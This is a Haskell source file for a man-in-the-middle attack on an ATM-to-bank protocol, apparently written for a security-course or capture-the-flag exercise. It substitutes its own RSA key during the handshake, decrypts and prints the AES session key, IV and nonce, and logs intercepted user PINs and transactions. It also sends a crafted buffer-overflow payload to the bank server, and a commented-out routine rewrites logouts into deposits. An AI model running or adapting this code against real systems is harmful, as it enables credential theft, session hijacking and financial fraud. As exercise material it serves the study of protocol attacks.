-- Hackage dependencies: asn1-encoding cryptonite network
{-# LANGUAGE NoMonomorphismRestriction, OverloadedStrings #-}
import Control.Applicative
import Control.Concurrent
import Control.Monad
import Crypto.Cipher.AES
import Crypto.Cipher.Types
import Crypto.Error
import Crypto.Hash.Algorithms
import Crypto.PubKey.RSA
import Crypto.PubKey.RSA.OAEP
import Crypto.Random
import Data.ASN1.BinaryEncoding
import Data.ASN1.BitArray
import Data.ASN1.Encoding
import Data.ASN1.Types
import Data.Char
import Data.Maybe
import Data.Word
import Network
import Network.Socket.ByteString
import System.Environment
import System.IO
import qualified Data.ByteString as B
import qualified Data.ByteString.Char8
import qualified Data.ByteString.Lazy as L

readMaybe = fmap fst . listToMaybe . reads

lToStrict = B.concat . L.toChunks
stringToBS = B.pack . map (fromIntegral . ord)
bsToString = map (chr . fromIntegral) . B.unpack

port = PortNumber . fromIntegral
unPort (PortNumber x) = x

main = withSocketsDo $ fmap (map readMaybe) getArgs >>= main'

main' [Just atmPort, Just bankPort] = main'' (port atmPort) (port bankPort)
main' _ = getProgName >>= \name -> putStrLn $ "Usage: " ++ name ++ " ATM_PORT BANK_PORT"

main'' atmPort bankPort = do
    listener <- listenOn atmPort
    forkIO $ connectTo "localhost" bankPort >>= handshakeExploit
    forever $ accept listener >>= forkIO . doMitm bankPort

dumbProxy atm bank logTo logFrom = loop where
    bufferSize = 4096
    loop = do
        atmEOF <- hIsEOF atm
        unless atmEOF $ do
            B.hGetSome atm bufferSize >>= logTo >>= B.hPut bank
            bankEOF <- hIsEOF bank
            unless bankEOF $ do
                B.hGetSome bank bufferSize >>= logFrom >>= B.hPut atm
                loop

expect h s = do
    s' <- B.hGetSome h (B.length s)
    unless (s == s') $ error "expect: unexpected input"

decodeX509Pubkey :: L.ByteString -> Maybe PublicKey
decodeX509Pubkey x = case decodeASN1 BER x of
    Right [Start Sequence,
        Start Sequence, OID [1,2,840,113549,1,1,1], Null, End Sequence,
        BitString (BitArray size s), End Sequence] ->
            case decodeASN1 BER (L.fromChunks [s]) of
                Right [Start Sequence, IntVal n, IntVal e, End Sequence] ->
                    Just (PublicKey (fromIntegral size `div` 8) n e)
                _ -> Nothing
    _ -> Nothing

encodeX509Pubkey :: PublicKey -> B.ByteString
encodeX509Pubkey (PublicKey size n e) = lToStrict $ encodeASN1 DER [Start Sequence,
        Start Sequence, OID [1,2,840,113549,1,1,1], Null, End Sequence,
        BitString (BitArray (fromIntegral size) s), End Sequence] where
    s = lToStrict $ encodeASN1 DER [Start Sequence, IntVal n, IntVal e, End Sequence]

mitmHandshake atm bank logTo logFrom = do
    let bufferSize = 4096
    let pubSizeBits = 3072
    expect atm "DUMMY"
    B.hPut bank "DUMMY"
    bankPubRaw <- B.hGetSome bank bufferSize
    --logFrom bankPubRaw
    (mitmPub, mitmPriv) <- generate (pubSizeBits `div` 8) 0x10001
    let Just bankPub = decodeX509Pubkey (L.fromChunks [bankPubRaw])
    --print bankPub
    --print mitmPub
    let bankPub' = bankPub { public_size = pubSizeBits `div` 8 } -- fiddle with things to get them to work
    print bankPub'
    B.hPut atm (encodeX509Pubkey mitmPub)
    encAES <- B.hGetSome atm bufferSize
    --logTo encAES
    let rawAES = either (error . show) id $ decrypt Nothing (defaultOAEPParams SHA1) mitmPriv encAES
    putStr "Raw AES key: "
    print $ rawAES
    let Right aes = eitherCryptoError $ cipherInit rawAES
    Right mitmAES <- encrypt (defaultOAEPParams SHA1) bankPub' rawAES
    --B.hPutStr bank mitmAES -- TODO: memory corruption exploit
    B.hPutStr bank ""
    expect bank "DUMMY"
    B.hPut atm "DUMMY"
    encIV <- B.hGetSome atm bufferSize
    let Right rawIV = decrypt Nothing (defaultOAEPParams SHA1) mitmPriv encIV
    putStr "Raw AES IV: "
    print $ rawIV
    Right mitmIV <- encrypt (defaultOAEPParams SHA1) bankPub' rawIV
    B.hPutStr bank mitmIV
    expect bank "DUMMY"
    B.hPut atm "DUMMY"
    encNonce <- B.hGetSome atm bufferSize
    let Just aesIV = makeIV rawIV
    let rawNonce = cfbDecrypt (aes :: AES128) aesIV encNonce
    putStr "Raw Initial Nonce: "
    print rawNonce
    let mitmNonce = cfbEncrypt (aes :: AES128) aesIV rawNonce
    B.hPutStr bank mitmNonce
    expect bank "DUMMY"
    B.hPut atm "DUMMY"
    return (aes, aesIV)


handshakeExploit bank = do
    let bufferSize = 4096
    let pubSizeBits = 3072
    B.hPut bank "DUMMY"
    bankPubRaw <- B.hGetSome bank bufferSize
    let Just bankPub = decodeX509Pubkey (L.fromChunks [bankPubRaw])
    let bankPub' = bankPub { public_size = pubSizeBits `div` 8 } -- fiddle with things to get them to work
    print bankPub'
    --let payload = B.replicate 342 0x41
    let payload' = "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadka"
    let payload = B.concat [B.replicate 36 0x41, B.replicate 4 1, B.replicate 302 0x42]
    putStr "Raw Payload: "
    print $ payload
    Right encPayload <- encrypt (defaultOAEPParams SHA1) bankPub' $ payload
    putStr "Encrypted Payload: "
    print $ encPayload
    B.hPutStr bank encPayload
    Right encIV <- encrypt (defaultOAEPParams SHA1) bankPub' $ B.replicate 20 0x43
    expect bank "DUMMY"
    B.hPutStr bank encIV
    B.hPutStr bank "dummy"
    expect bank "DUMMY"


data ActionType = Balance | Deposit | Login | Logout | Malformed | Transfer | Unknown | Withdraw
    deriving (Enum, Eq, Show)

data Action = Action {
    actUser :: B.ByteString,
    actPin :: B.ByteString,
    actOldNonce :: B.ByteString,
    actNewNonce :: B.ByteString,
    actCmd :: ActionType,
    actAmount :: Int, -- cents
    actRecipient :: B.ByteString
    } deriving Show

deserializeAction :: B.ByteString -> Maybe Action
deserializeAction s = aux where
    readB = readMaybe . bsToString
    split' c = B.split (fromIntegral $ ord c)
    aux = case map (split' ';') $ split' ':' s of
        [[oldNonce, newNonce],[_],[user,pin,cmd,amount,recipient],[_]] -> do
            cmd' <- readB cmd
            return $ Action {
                actUser = user,
                actPin = pin,
                actOldNonce = oldNonce,
                actNewNonce = newNonce,
                actCmd = toEnum cmd',
                actAmount = maybe 0 id $ readB amount,
                actRecipient = recipient
                }
        _ -> Nothing

serializeAction :: MonadRandom m => Action -> m B.ByteString
serializeAction (Action user pin oNonce nNonce cmd amt reci) = do
    let actionBufferSize = 128
    let cmd' = stringToBS . show $ fromEnum cmd
    let amt' = stringToBS $ show amt
    let pad1Size = 1
    let pad2Size = actionBufferSize - (sum (map B.length [oNonce, nNonce, user, pin, cmd', amt', reci]) + 8)
    pad1 <- getRandomBytes pad1Size
    pad2 <- getRandomBytes pad2Size
    return $ B.intercalate ":" [
        B.intercalate ";" [oNonce, nNonce],
        pad1,
        B.intercalate ";" [user, pin, cmd', amt', reci],
        pad2
        ]

-- unfortunately, this is checked for, and the server prints "These shouldn't happen." to stdout
replaceLogoutWithDeposit aes aesIv action ctxt = if actCmd action == Logout
    then do
        let action' = action { actCmd = Deposit, actAmount = 31337 } 
        ptxt' <- serializeAction action'
        return $ cfbEncrypt aes aesIv ptxt'
    else return ctxt

passiveMitm atm bank logTo logFrom aes aesIv = dumbProxy atm bank (wrap logTo) (wrap logFrom) where
    bufferSize = 4096
    wrap log ctxt = do
        let ptxt = cfbDecrypt (aes :: AES128) aesIv ctxt
        --let split' c = B.split (fromIntegral $ ord c)
        --print . map (split' ';') . split' ':' $ ptxt
        let action = deserializeAction ptxt
        case deserializeAction ptxt of
            Just action -> do
                log (stringToBS $ show action)
                -- TODO: just intercept pins and spawn a seperate connection (less invasive)
                --replaceLogoutWithDeposit aes aesIv action ctxt
                return ctxt
            _ -> do
                log ptxt
                return ctxt

doMitm bankPort (atm, host, atmPort) = do
    putStrLn $ "Received a connection from " ++ host ++ ":" ++ show atmPort
    putStrLn $ "Forwarding to localhost:" ++ show (unPort bankPort)
    bank <- connectTo "localhost" bankPort
    let log p q s = (putStrLn $ show p ++ " -> " ++ show q ++ ": " ++ show s) >> return s
    let logTo = log atmPort (unPort bankPort) :: B.ByteString -> IO B.ByteString
    let logFrom = log (unPort bankPort) atmPort  :: B.ByteString -> IO B.ByteString
    --dumbProxy atm bank logTo logFrom
    (aes, aesIV) <- mitmHandshake atm bank logTo logFrom
    passiveMitm atm bank logTo logFrom aes aesIV